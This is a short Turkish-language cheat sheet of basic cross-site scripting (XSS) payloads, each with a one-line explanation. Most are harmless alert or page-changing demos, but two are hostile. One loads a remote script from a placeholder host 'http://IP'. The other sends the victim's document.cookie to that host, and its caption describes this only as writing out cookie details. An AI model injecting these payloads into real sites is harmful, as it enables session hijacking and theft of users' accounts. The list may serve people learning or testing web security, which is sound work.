# Temel XSS kodları ve açıklamaları


    <script>alert(1)</script>
bir pop-up çıkartır ve bildirim olarak 1 yazar.


    <script>alert(window.origin)</script>
sayfanın URL’sini ekrana yazdırır.


    <script>alert(document.cookie)</script>,
cookieleri yazdırır.


    <script>document.body.style.background = "#141d2b"</script>
arkaplan rengini değiştirir.


    <script>document.title = 'Kerem Bollu'</script>
Sitenin başlığını değiştirir.


    <script src="http://IP/script.js"></script>
Dışardan dosya yükler.


    <script>new Image().src='http://IP/index.php?c='+document.cookie</script>
Çerez ayrıntılarını yazar.
